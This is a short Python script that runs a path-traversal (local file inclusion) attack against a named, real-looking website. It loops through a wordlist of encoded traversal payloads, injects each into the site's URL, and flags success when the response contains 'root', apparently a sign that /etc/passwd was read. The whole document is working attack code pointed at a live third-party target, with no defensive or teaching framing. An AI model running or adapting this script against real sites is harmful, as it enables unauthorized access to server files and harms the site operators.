import requests


# [LFI]
url = 'https://kpolyakov.spb.ru/[LFI]'

with open('traversals-8-deep-exotic-encoding.txt', 'r') as f:
    for line in f.readlines():
        payload = line.strip()
        url_with_payload = url.replace('[LFI]', payload)
        r = requests.get(url_with_payload)
        if 'root' in r.text:
            print(f'Len: {len(r.content)}; Found: {payload}')
            break
        else:
            print(f'Len: {len(r.content)}; Not found: {payload}')
